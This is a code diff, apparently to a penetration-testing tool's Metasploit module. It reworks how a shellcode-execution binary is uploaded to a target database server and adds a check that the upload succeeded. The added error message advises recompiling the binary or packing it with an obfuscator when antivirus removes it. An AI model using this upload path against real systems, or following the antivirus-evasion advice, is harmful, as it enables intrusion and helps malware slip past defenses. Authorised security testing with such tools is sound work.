@@ -585,19 +585,30 @@ class Metasploit:
 
         __basename = "tmpse%s%s" % (self._randStr, ".exe" if Backend.isOs(OS.WINDOWS) else "")
 
-        if web:
-            self.shellcodeexecRemote = "%s/%s" % (self.webDirectory, __basename)
-        else:
-            self.shellcodeexecRemote = "%s/%s" % (conf.tmpPath, __basename)
-
+        self.shellcodeexecRemote = "%s/%s" % (conf.tmpPath, __basename)
         self.shellcodeexecRemote = ntToPosixSlashes(normalizePath(self.shellcodeexecRemote))
 
         logger.info("uploading shellcodeexec to '%s'" % self.shellcodeexecRemote)
 
         if web:
-            self.webUpload(self.shellcodeexecRemote, self.webDirectory, filepath=self.shellcodeexecLocal)
+            written = self.webUpload(self.shellcodeexecRemote, os.path.split(self.shellcodeexecRemote)[0], filepath=self.shellcodeexecLocal)
         else:
-            self.writeFile(self.shellcodeexecLocal, self.shellcodeexecRemote, "binary")
+            written = self.writeFile(self.shellcodeexecLocal, self.shellcodeexecRemote, "binary", forceCheck=True)
+
+        if written is not True:
+            errMsg = "there has been a problem uploading shellcodeexec, it "
+            errMsg += "looks like the binary file has not been written "
+            errMsg += "on the database underlying file system or an AV has "
+            errMsg += "flagged it as malicious and removed it. In such a case "
+            errMsg += "it is recommended to recompile shellcodeexec with "
+            errMsg += "slight modification to the source code or pack it "
+            errMsg += "with an obfuscator software"
+            logger.error(errMsg)
+
+            return False
+        else:
+            logger.info("shellcodeexec successfully uploaded")
+            return True
 
     def pwn(self, goUdf=False):
         if goUdf:
